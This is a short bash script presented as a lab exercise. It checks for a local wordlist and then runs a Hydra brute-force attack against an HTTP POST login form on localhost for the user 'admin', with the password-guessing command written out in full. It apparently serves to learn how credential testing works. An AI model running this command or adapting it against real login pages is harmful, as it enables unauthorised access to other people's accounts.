#!/bin/bash

# Lab Simulation Script: Hydra Brute Force Logic
# Purpose: demonstrate automated credendital testing workflow

TARGET_IP="127.0.0.1" # Example IP
USER="admin"
WORDLIST="./passwords.txt"

echo "[+] Starting reconnaissance on $TARGET_IP..."
# Simulation curl to find input names
echo "[!] Form analysis: user_iput='user', pass_input='pass'"

if [ -f "$WORDLIST" ]; then
  echo "[+] Wordlist found. Initializing Hydra..."
  # The command that i learned at the lab
  hydra -l $USER -P $WORDLIST $TARGET_IP http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid" -V
else
  echo "[-] Error: Wordlist not found"
  exit 1
fi
